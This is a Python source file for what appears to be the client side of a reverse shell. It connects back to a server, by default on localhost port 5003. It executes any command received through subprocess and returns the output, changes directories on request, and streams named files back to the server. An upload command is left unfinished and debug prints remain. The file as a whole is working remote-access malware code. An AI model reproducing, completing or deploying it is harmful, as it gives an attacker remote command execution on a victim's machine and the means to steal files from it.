import socket
import subprocess
import os

# import sys
#
# SERVER_HOST = sys.argv[1]

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003
BUFFER_SIZE = 1024
FORMAT = "utf-8"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    elif command.split()[0].lower() == "download":
        [_, file_path, _] = command.split()
        file_name = os.path.basename(file_path)
        try:
            file = open(file_path, "r+")
            """ Sending the filename to the server. """
            s.send(file_name.encode(FORMAT))
            msg = s.recv(BUFFER_SIZE).decode(FORMAT)
            print(f"[SERVER]: {msg}")
            """ Sending the file data to the server. """
            sub_data = str()

            while sub_data != "END":
                print("before")
                print("after")
                sub_data = file.read(BUFFER_SIZE)
                if not sub_data:
                    sub_data = "END"

                s.send(sub_data.encode(FORMAT))

            print("after while")
            msg = s.recv(BUFFER_SIZE).decode(FORMAT)

            print(f"[SERVER]: {msg}")
            """ Closing the file. """
            file.close()

        except FileNotFoundError as NoFileErr:
            s.send(str(NoFileErr).encode(FORMAT))
        except Exception as err:
            s.send(str(err).encode(FORMAT))

        # data = file.read()

    elif command.split()[0].lower() == "upload":
        [_, file_path, destination] = command.split()

    elif command.startswith("cd "):
        os.chdir(str(command[3:]))
        s.send(os.getcwd().encode())
    else:
        # execute the command and retrieve the results
        print("before")
        output = subprocess.getoutput(command)
        print("after")
        # send the results back to the server
        if not output:
            output = "done"
        s.send(output.encode())
# close client connection
s.close()
